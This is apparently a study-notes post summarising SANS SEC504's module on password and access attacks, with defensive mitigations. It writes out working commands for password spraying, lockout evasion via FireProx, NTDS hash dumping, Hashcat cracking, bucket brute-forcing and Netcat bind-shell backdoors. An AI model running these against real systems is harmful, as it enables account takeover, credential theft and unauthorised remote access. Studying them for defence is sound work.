---
title: Password and Access Attacks - SEC504.3
parent: SEC504
grand_parent: SANS
great_grand_parent: Categories
nav_order: 3
layout: default
---

# Password and Access Attacks (Inspired by SANS SEC504.3)

This post outlines critical takeaways from my study of the third module in SANS SEC504, focused on password-based attacks, password hashing, cracking, cloud identity misuse, and the use of utilities like Netcat. This is a restructured interpretation of the material for educational use only.

---

## Network-Based Password Attacks

### Guessing vs Spraying

* **Guessing** involves trying multiple passwords for a single known username
* **Spraying** rotates one or two passwords across many usernames to avoid lockouts

### Tools

* **THC Hydra**: Supports SSH, SMB, RDP, etc

```bash
hydra -L users.txt -P passwords.txt ssh://<ip>
```

* **MSOLSpray**: Used against Microsoft 365 endpoints

```powershell
Invoke-MSOLSpray -UserList ./users.txt -Password <password>
```

### Password Selection Strategy

* Use seasonal, organizational, or topical passwords
* Match password policy constraints
* Generate short lists for spraying

---

## Credential Stuffing & Breached Data

### Concept

* Reuse of credentials from unrelated breaches
* Easy access via breach corpuses (e.g., HaveIBeenPwned)

### Commands

```bash
grep -i '@domain.com' breach.txt
grep -i username breach.txt
```

---

## Microsoft 365 Attacks

### Authentication API

* `/common/oauth2/token` endpoint gives detailed auth responses

### MSOLSpray with FireProx

```bash
python3 fire.py --command create --region us-east-1 --url https://login.microsoft.com
```

```powershell
Invoke-MSOLSpray -UserList users.txt -URL <fireprox-url> -Password Password123!
```

### MFA Bypass Detection

* Exploit weak conditional access policies
* Detect changes in account/mailing permissions via audit logs

```powershell
Get-MsolUser -All | Where {$_.IsLicensed} | Select DisplayName, Licenses
```

### MFA Verification

```powershell
Invoke-MFASweep -Username user -Password pass
```

---

## Password Hashes & Cracking

### Hashing Algorithms

* **Windows**: LANMAN, NT (NTLM)
* **Linux/UNIX**: DES, MD5, SHA256, SHA512, Blowfish
* **Modern**: PBKDF2, Argon2, Scrypt, Yescrypt

### Hash Extraction

```bash
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

```bash
Meterpreter > hashdump
```

### Linux Hash Recognition

* `$6$` = SHA512
* `$5$` = SHA256
* `$1$` = MD5

### Password Cracking: Hashcat

* Dictionary mode: `-a 0`
* Combinator: `-a 1`
* Mask (pattern-based): `-a 3`
* Hybrid (wordlist + mask): `-a 6` or `-a 7`

```bash
hashcat -m 1000 -a 0 hashes.txt rockyou.txt
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?d?d
```

### Hashcat Enhancements

* Rules: mutate dictionary entries
* Potfile: stores recovered passwords
* `--show`, `--left`, `--user` for outputs

---

## Mitigations & Defenses

### Password Complexity

* Avoid enforced 90-day rotation
* Encourage long, memorable passphrases
* Enforce minimum 12–20 character policies

### Disable Legacy Protocols

* Disable LANMAN hashes via registry

```reg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\NoLMHash = 1
```

### Use MFA

* Adopt FIDO2 or equivalent
* Require for all externally accessible apps
* Make credential reuse less harmful

---

## Cloud Storage Risks

### Misconfigurations

* Public access to S3, GCP, or Azure containers
* Often created for benign use and later populated with sensitive data

### Discovery Tools

* **bucket\_finder.rb**

```bash
bucket_finder.rb wordlist.txt --download
```

* **GCPBucketBrute**

```bash
gcpbucketbrute.py -u -k company
```

* **BasicBlobFinder (Azure)**

```bash
basicblobfinder.py names.txt
```

### Naming Strategies

* Use creative permutations and dev/test naming conventions
* Public resources may be found via:

  * DNS queries
  * HTTP proxy logs
  * Network monitoring

---

## Netcat: Attack and Defense

### Basic Use

```bash
nc -v -w2 -z <target> 1-1000
```

* File transfer, shell access, port scanning, relays

### Examples

* Listener mode:

```bash
nc -l -p 4444 > file.txt
```

* Client upload:

```bash
nc <ip> 4444 < file.txt
```

* Backdoor (Windows):

```bash
nc -l -p 1234 -e cmd.exe
```

### Persistent Listener (Linux)

```bash
while true; do nc -l -p 4444 -e /bin/sh; done
```

### Netcat Relay

```bash
mkfifo backpipe
nc -l -p 2222 < backpipe | nc 10.0.0.1 80 > backpipe
```

### Defensive Measures

* Monitor for odd open ports
* Block unused ports at network and host layers
* Alert on unexpected shell processes tied to open sockets

---

## Summary

This module explores the lifecycle of password abuse from login attempts to hash cracking and cloud enumeration. It emphasizes the need for layered defenses, creative detection, and making stolen credentials valueless through modern authentication practices.

*Credit to SANS SEC504 for guiding the understanding behind these techniques and defenses.*
